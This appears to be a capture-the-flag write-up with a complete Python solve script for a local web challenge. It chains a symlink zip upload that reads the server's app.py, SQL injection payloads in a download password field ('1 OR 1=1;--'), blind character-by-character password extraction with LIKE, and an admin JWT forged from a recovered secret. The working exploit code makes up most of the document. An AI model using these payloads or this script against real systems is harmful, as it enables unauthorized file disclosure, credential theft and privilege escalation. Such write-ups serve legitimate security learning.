We upload a zip file and it lets you download it but you need a password to unzip it. So they're probably taking your zip file, unzip it, and rezip with a new password. 
So what we do is ln -s a targetfile, zip it, upload it, and then use SQL injection to donwload our file which will rezip our file but this time with the symlink 
as well.

One of the things you messed up on is when you tried 'OR '1'='1 you got an internal server error which means there is some conflicts going on with the DBMS, but
the webapp was kind of shitty and would error out with any string input so it was hard to tell. Moreover, the final SQL injection didn't need to break out of anything, 
you could've just done this in the password field to download the zip file.
```1 OR 1=1;--```

Lastly, you use ```LIKE``` to dump the password character by character using **blind SQL Injection**.

```1 OR password LIKE '{extracted_password}{hex_char}%';--```

```python
import requests
import jwt
import os
import json
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text

# Base URL for the server
BASE_URL = "http://127.0.0.1:5000/"
HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}

# Initialize Rich console
console = Console()

def print_success(message):
    console.print(f":heavy_check_mark: {message}", style="bold green")

def print_failure(message):
    console.print(f":x: {message}", style="bold red")

def print_progress(message):
    console.print(f":arrow_forward: {message}", style="bold cyan")

# Step 1: Create an account
def create_account(username, password):
    print_progress("Step 1: Creating account...")
    data = {'username': username, 'password': password}
    response = requests.post(f"{BASE_URL}/register", data=data, headers=HEADERS)
    if response.status_code == 200:
        print_success("Account created successfully!")
        return response
    print_failure("Failed to create account.")
    return None

# Step 2: Login and retrieve the auth token
def login(username, password):
    print_progress("Step 2: Logging in...")
    data = {'username': username, 'password': password}
    response = requests.post(f"{BASE_URL}/login", data=data, headers=HEADERS, allow_redirects=False)
    if 'Set-Cookie' in response.headers:
        auth_token = response.headers['Set-Cookie'].split("=")[1].split(";")[0]
        print_success("Logged in successfully!")
        return auth_token
    print_failure("Login failed.")
    return None

# Step 3: Create a malicious zip file for ZipSlip exploit
def create_zip_slip():
    print_progress("Step 3: Creating ZipSlip exploit file...")
    os.system("rm -rf meow.zip meow 2>/dev/null")
    os.system("ln -s /app/app.py meow")
    os.system("zip --symlinks meow.zip meow")
    print_success("ZipSlip exploit file created.")

# Step 4: Exploit SQL injection to download file
def exploit_sqli_to_download_file(auth_token, file_id):
    print_progress("Step 4: Exploiting SQL injection to download file...")
    cookies = {'auth_token': auth_token}
    data = {'file_id': file_id, 'password': '1 OR 1=1;--'}
    response = requests.post(f"{BASE_URL}/download", cookies=cookies, data=data)
    with open("upload.zip", "wb") as file:
        file.write(response.content)
    print_success("File downloaded via SQL injection.")

# Step 5: Extract the password using SQL injection
def exploit_sqli_to_extract_password(auth_token, file_id):
    print_progress("Step 5: Extracting password using SQL injection...")
    cookies = {'auth_token': auth_token}
    extracted_password = ""
    for _ in range(16):
        for char in range(16):
            hex_char = hex(char)[2:]
            data = {'file_id': file_id, 'password': f"1 OR password LIKE '{extracted_password}{hex_char}%';--"}
            response = requests.post(f"{BASE_URL}/download", cookies=cookies, data=data)
            if "Invalid ID or password!" not in response.text:
                extracted_password += hex_char
                break
    print_success("Password extracted successfully!")
    return extracted_password

# Step 6: Build a JWT for admin access
def build_jwt_for_admin(secret_key):
    print_progress("Step 6: Building admin JWT...")
    payload = {'user_id': 'testuser', 'role': 'admin'}
    token = jwt.encode(payload, secret_key, algorithm='HS256')
    print_success("Admin JWT created.")
    return token

# Step 7: Print the flag using the admin JWT
def print_flag(auth_token):
    print_progress("Step 7: Retrieving the flag...")
    cookies = {'auth_token': auth_token}
    response = requests.get(f"{BASE_URL}/admin", cookies=cookies)
    flag = response.text.strip()
    border_width = max(len(flag) + 8, 40)
    panel = Panel(flag.center(border_width), title="Flag", style="bold yellow", width=border_width)
    console.print(panel)

# Main workflow
def main():
    username = "testuser"
    password = "testpass"

    # Step 1: Create account
    if not create_account(username, password):
        exit()

    # Step 2: Login
    auth_token = login(username, password)
    if not auth_token:
        exit()

    # Step 3: Exploit ZipSlip vulnerability
    create_zip_slip()
    with open('meow.zip', 'rb') as zip_file:
        files = {'zipfile': ('meow.zip', zip_file.read(), 'application/zip')}
        requests.post(f"{BASE_URL}/upload", cookies={'auth_token': auth_token}, files=files)

    # Step 4: SQL injection to download file
    exploit_sqli_to_download_file(auth_token, 1)

    # Step 5: Extract password
    extracted_password = exploit_sqli_to_extract_password(auth_token, 1)
    console.print(f"Extracted Password: [bold]{extracted_password}[/bold]")

if __name__ == "__main__":
    main()
```
